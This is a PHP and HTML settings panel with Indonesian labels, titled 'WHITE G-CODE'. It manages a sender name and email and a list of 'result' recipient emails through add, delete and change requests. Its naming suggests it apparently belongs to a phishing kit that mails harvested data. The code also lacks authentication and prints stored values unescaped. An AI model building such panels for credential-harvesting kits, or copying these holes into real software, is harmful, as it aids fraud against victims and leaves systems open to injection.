<?php
include 'data.php';
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WHITE G-CODE | SETTING PANEL</title>
  <link rel='stylesheet' href='https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.css'><link rel="stylesheet" href="./style.css">
  <link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/>
  
</head>
<body>
<div class="container" style="height:110vh;display:flex;align-items: center;justify-content: center;">
<body style="background-color: #005B8F;">
  <form class="container" id="needs-validation" onsubmit="return false">
    <div class="add">
      <div class="form-group">
      	<center>
      <img src="https://imgtr.ee/images/2024/05/16/fc404c0f618e90daa1857681e595708e.png" style="transform:scale(1.2);max-width: 55%">
    </center>
  </div>

      <div class="jumbotron p-2">
      <nav class="navbar navbar-light bg-primary text-white p-0 pl-2 rounded">
        <a class="navbar-brand text-white" href="#">
        	<img src="https://imgtr.ee/images/2024/05/16/fc404c0f618e90daa1857681e595708e.png" width="30" height="30" class="d-inline-block align-top" alt="Logo Wahyu Store">
          𝘿𝙖𝙩𝙖 𝙍𝙚𝙨𝙪𝙡𝙩
        </a>
      </nav>
        <label class="mt-3" for="exampleInputEmail1">𝙉𝙞𝙘𝙠 𝙎𝙚𝙣𝙙𝙚𝙧</label>
        <input type="email" class="form-control" value="<?= $nik; ?>" readonly>
        <label class="mt-2" for="exampleInputEmail1">𝙀𝙢𝙖𝙞𝙡 𝙎𝙚𝙣𝙙𝙚𝙧</label>
        <input type="email" class="form-control" value="<?= $sender; ?>" readonly>
        	
        <button class="btn btn-primary mt-3" data-toggle="modal" data-target="#gantidata">𝙂𝙖𝙣𝙩𝙞 𝘿𝙖𝙩𝙖</button>
      </div>




      







      
      <div class="jumbotron p-2">
        <nav class="navbar navbar-light bg-primary text-white p-0 pl-2 rounded">
        <a class="navbar-brand text-white" href="#">
        	<img src="https://imgtr.ee/images/2024/05/16/fc404c0f618e90daa1857681e595708e.png" width="30" height="30" class="d-inline-block align-top" alt="Logo Wahyu Store">
          𝘿𝙖𝙩𝙖 𝙀𝙢𝙖𝙞𝙡
        </a>
      </nav>
      <label class="mt-3" for="exampleInputEmail1">𝙇𝙞𝙨𝙩 𝙀𝙢𝙖𝙞𝙡</label>
          <?php
          $read = file_get_contents('data.json');
          $json = json_decode($read,true);

          for($i=0;$i<=count($json) - 1;$i++)
          {
            echo '<input type="email" class="form-control mt-1" value="'.$json[$i]['email'].'" readonly>';
          }

          ?>

      <div class="mt-3">
        <button class="btn btn-primary" data-toggle="modal" data-target="#exampleModalCenter">𝙏𝙖𝙢𝙗𝙖𝙝 𝙀𝙢𝙖𝙞𝙡</button>
      <button class="btn btn-danger" data-toggle="modal" data-target="#delete">𝙃𝙖𝙥𝙪𝙨 𝙀𝙢𝙖𝙞𝙡</button>
    </div>
    </div>
    </div>
</form>
</div>



<div class="modal fade" id="gantidata" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">𝙂𝙖𝙣𝙩𝙞 𝘿𝙖𝙩𝙖</h5>
      </div>
      <div class="modal-body">
      <div class="form-group">
      <label for="exampleInputEmail1">𝙉𝙞𝙘𝙠 𝙎𝙚𝙣𝙙𝙚𝙧</label>
        <input type="text" id="valNick" class="form-control" value="<?= $nik; ?>">
        <label class="mt-2" for="exampleInputEmail1">𝙀𝙢𝙖𝙞𝙡 𝙎𝙚𝙣𝙙𝙚𝙧</label>
        <input type="email" id="valSender" class="form-control" value="<?= $sender; ?>">
      </div>

      </div>
      <div class="modal-footer d-flex justify-content-start">
        <button type="button" id="gantis" class="btn btn-success">𝙂𝙖𝙣𝙩𝙞</button>
        <button type="button" class="btn btn-danger" data-dismiss="modal">𝘾𝙖𝙣𝙘𝙚𝙡</button>
      </div>
    </div>
  </div>
</div>





<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">𝙏𝙖𝙢𝙗𝙖𝙝 𝙀𝙢𝙖𝙞𝙡</h5>
      </div>
      <div class="modal-body">
        <div id="sukses" style="display: none" class="alert alert-success alert-dismissible fade show" role="alert">
        𝙀𝙢𝙖𝙞𝙡 𝙠𝙖𝙢𝙪 <span id="emmail"></span> 𝙗𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙙𝙞𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣
        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="form-group">
      <label for="exampleInputEmail1">𝙀𝙢𝙖𝙞𝙡 𝙖𝙙𝙙𝙧𝙚𝙨𝙨</label>
      <input type="email" class="form-control" id="addEmail" aria-describedby="emailHelp" placeholder="Masukkan email baru">
      </div>

      </div>
      <div class="modal-footer d-flex justify-content-start">
        <button type="button" id="add" class="btn btn-primary">𝙏𝙖𝙢𝙗𝙖𝙝</button>
        <button type="button" class="btn btn-danger" data-dismiss="modal">𝘾𝙖𝙣𝙘𝙚𝙡</button>
      </div>
    </div>
  </div>
</div>



<div class="modal fade" id="delete" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">𝙃𝙖𝙥𝙪𝙨 𝙀𝙢𝙖𝙞𝙡</h5>
      </div>
      <div class="modal-body">
        <div id="suksess" style="display: none" class="alert alert-success alert-dismissible fade show" role="alert">
        𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙢𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙚𝙢𝙖𝙞𝙡
        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="form-group">

        <select style="width:100%;" class="custom-select" name="zz">
          <option selected disabled>𝙋𝙞𝙡𝙞𝙝 𝙚𝙢𝙖𝙞𝙡 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙠𝙖𝙢𝙪 𝙝𝙖𝙥𝙪𝙨</option>
          <?php
          $read = file_get_contents('data.json');
          $json = json_decode($read,true);

          for($i=0;$i<=count($json) - 1;$i++)
          {
            echo '<option value="'.$i.'">'.$json[$i]['email'].'</'.'option>';
          }

          ?>
        </select>


      </div>

      </div>
      <div class="modal-footer d-flex justify-content-start">
        <button type="button" id="dels" class="btn btn-primary">𝙃𝙖𝙥𝙪𝙨</button>
        <button type="button" class="btn btn-danger" data-dismiss="modal">𝘾𝙖𝙣𝙘𝙚𝙡</button>
      </div>
    </div>
  </div>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src='https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.js'></script><script  src="./script.js"></script>

<script type="text/javascript">
  $('#add').click(function(){
    $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
    $.get('add.php?mail='+$('#addEmail').val(),function(done){
      if(done == 200)
      {
        setTimeout(() => {
          $('#add').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
          location.reload()
        },2000)
      }
    })
  })

  $('#dels').click(function(){
  $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
  $.get('delete.php?keys='+$('select[name=zz] option').filter(':selected').val(),function(done){
    if(done == 200)
    {
      setTimeout(() => {
        $('#dels').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
        location.reload()
      },2000)
    }
  })
})

  $('#gantis').click(function(){
  const nick = $('#valNick').val();
  const sender = $('#valSender').val();
  $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
  $.get('ganti.php?nick='+nick+'&sender='+sender,function(done){
    if(done == 200)
    {
      setTimeout(() => {
        $('#gantis').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
        location.reload()
      },2000)
    }
  })
})
</script>


</body>
</html>
